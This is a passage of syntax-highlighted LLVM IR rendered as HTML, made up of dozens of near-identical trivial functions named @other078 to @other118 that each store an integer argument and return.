nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other078</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other079</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other080</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other081</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other082</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other083</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other084</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other085</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other086</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other087</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other088</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other089</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other090</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other091</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other092</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other093</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other094</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other095</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other096</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other097</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other098</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other099</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other100</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other101</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other102</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other103</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other104</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other105</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other106</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other107</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other108</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other109</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other110</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other111</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other112</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other113</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other114</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other115</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other116</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other117</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other118</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span 